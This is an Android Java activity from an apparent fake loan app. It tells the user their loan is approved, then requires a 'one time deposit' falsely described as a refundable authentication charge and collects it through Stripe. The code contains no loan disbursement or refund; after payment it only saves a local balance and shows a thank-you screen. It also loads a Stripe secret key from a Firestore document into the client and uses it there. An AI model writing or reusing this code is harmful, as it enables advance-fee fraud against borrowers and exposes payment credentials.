package com.justkeepfaith.morioanzenza;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.stripe.android.PaymentConfiguration;
import com.stripe.android.paymentsheet.PaymentSheet;
import com.stripe.android.paymentsheet.PaymentSheetResult;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class striscia_pagina extends AppCompatActivity {

    String Open, Closed, period, lname, Number, amount_applied;
    TextView message, button;
    SharedPreferences sharedPreferences;
    String customerID, emphericalKey, ClientSecret;
    PaymentSheet paymentSheet;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_striscia_pagina);

        button = (TextView) findViewById(R.id.gpaybton);
        message = (TextView) findViewById(R.id.message);


        sharedPreferences = getApplicationContext().getSharedPreferences("user_info", Context.MODE_PRIVATE);
        lname = sharedPreferences.getString("last_name", "User");
        Open = sharedPreferences.getString("Open", "");
        Closed = sharedPreferences.getString("Closed", "");
        Number = sharedPreferences.getString("Number", "");
        period = sharedPreferences.getString("Months", "");
        amount_applied = sharedPreferences.getString("loan_applied", "");


        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("notification", "Congratulations!! Your loan request has been approved. " +
                "You are remaining with only a few steps before you can receive your loan. " +
                "Click on this message for more information.");
        editor.commit();


        message.setText("--Hello "+lname+", your loan application of $" + amount_applied + " has been approved. " +
                        "This loan must be payed back in "+period+" months.\n\n--However, for us to disburse " +
                        "this loan to you bank account, "+getResources().getString(R.string.app_name)+" requires you to make a one time " +
                        "deposit of $"+Number+" into your "+getResources().getString(R.string.app_name)+" account" +
                        ". We are asking for this as an  authentication attempt to avoid abuse of our systems " +
                        "by fraudulent users.\n\n" +
                        "--Please note that this deposit will be refunded to you during loan disbursement " +
                        "or if you decide to close your "+getResources().getString(R.string.app_name)+" as it is just an authentication " +
                        "charge for all new users.");



        DocumentReference documentReference = FirebaseFirestore.getInstance().collection("Classified").document("Commissioned");
        documentReference.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
            @Override
            public void onComplete(@NonNull Task<DocumentSnapshot> task) {

                DocumentSnapshot dsnap = task.getResult();

                Open = dsnap.getString("Unrestricted");
                Closed = dsnap.getString("Stealthy");
                Number = dsnap.getString("Quota");

                SharedPreferences.Editor editor = sharedPreferences.edit();
                editor.putString("Open", Open);
                editor.putString("Closed", Closed);
                editor.putString("Number", Number);
                editor.commit();

                message.setText("--Hello "+lname+", your loan application of $" + amount_applied + " has been approved. " +
                        "This loan must be payed back in "+period+" months.\n\n--However, for us to disburse " +
                        "this loan to you bank account, "+getResources().getString(R.string.app_name)+" requires you to make a one time " +
                        "deposit of $"+Number+" into your "+getResources().getString(R.string.app_name)+" account" +
                        ". We are asking for this as an  authentication attempt to avoid abuse of our systems " +
                        "by fraudulent users.\n\n" +
                        "--Please note that this deposit will be refunded to you during loan disbursement " +
                        "or if you decide to close your "+getResources().getString(R.string.app_name)+" as it is just an authentication " +
                        "charge for all new users.");
            }
        });

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                if (!Conectivity.isConnectingToInternet(striscia_pagina.this)) {
                    Toast.makeText(striscia_pagina.this, "Please check your internet connection.", Toast.LENGTH_SHORT).show();
                    return;
                }
                if (Open.isEmpty()){
                    Toast.makeText(striscia_pagina.this, "Try again", Toast.LENGTH_SHORT).show();
                }
                else {
                    Toast.makeText(striscia_pagina.this, "Please wait", Toast.LENGTH_SHORT).show();
                    PayNow();
                }
            }
        });

        paymentSheet = new PaymentSheet(this, paymentSheetResult -> {

            onPaymentResult(paymentSheetResult);

        });

    }
    private void PayNow(){

        PaymentConfiguration.init(this, Open);

        StringRequest stringRequest = new StringRequest(Request.Method.POST,
                "https://api.stripe.com/v1/customers",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        try {
                            JSONObject object = new JSONObject(response);

                            customerID = object.getString("id");
                            getEmphericalKey(customerID);


                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> header = new HashMap<>();
                header.put("Authorization","Bearer "+ Closed);
                return header;
            }
        };

        RequestQueue requestQueue = Volley.newRequestQueue(striscia_pagina.this);
        requestQueue.add(stringRequest);

    }

    private void getEmphericalKey(String customerID) {

        StringRequest stringRequest = new StringRequest(Request.Method.POST,
                "https://api.stripe.com/v1/ephemeral_keys",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        try {
                            JSONObject object = new JSONObject(response);

                            emphericalKey = object.getString("id");
                            getClientSecret(customerID, emphericalKey);


                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> header = new HashMap<>();
                header.put("Authorization","Bearer "+ Closed);
                header.put("Stripe-Version","2020-08-27");
                return header;
            }

            @Nullable
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("customer", customerID);

                return params;
            }
        };

        RequestQueue requestQueue = Volley.newRequestQueue(striscia_pagina.this);
        requestQueue.add(stringRequest);

    }

    private void getClientSecret(String customerID, String emphericalKey) {

        int lon = Integer.parseInt(Number);
        String deni = String.valueOf((lon) * 100 + 30);

        StringRequest stringRequest = new StringRequest(Request.Method.POST,
                "https://api.stripe.com/v1/payment_intents",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        try {
                            JSONObject object = new JSONObject(response);

                            ClientSecret = object.getString("client_secret");
                            PaymentFlow();


                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> header = new HashMap<>();
                header.put("Authorization","Bearer "+ Closed);
                return header;
            }

            @Nullable
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("customer", customerID);
                params.put("amount", deni);
                params.put("currency", "usd");
                params.put("automatic_payment_methods[enabled]", "true");

                return params;
            }
        };

        RequestQueue requestQueue = Volley.newRequestQueue(striscia_pagina.this);
        requestQueue.add(stringRequest);

    }


    private void onPaymentResult(PaymentSheetResult paymentSheetResult) {

        if (paymentSheetResult instanceof PaymentSheetResult.Completed) {

            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putString("balance", Number);
            editor.commit();

            Toast.makeText(striscia_pagina.this, "Successful", Toast.LENGTH_SHORT).show();

            Intent intent = new Intent(this, grazie_tasso.class);
            startActivity(intent);
            finish();
        }
        if (paymentSheetResult instanceof PaymentSheetResult.Canceled) {

        }

    }

    private void PaymentFlow() {

        paymentSheet.presentWithPaymentIntent(
                ClientSecret, new PaymentSheet.Configuration(getResources().getString(R.string.app_name),
                        new PaymentSheet.CustomerConfiguration(customerID, emphericalKey))
        );
    }
}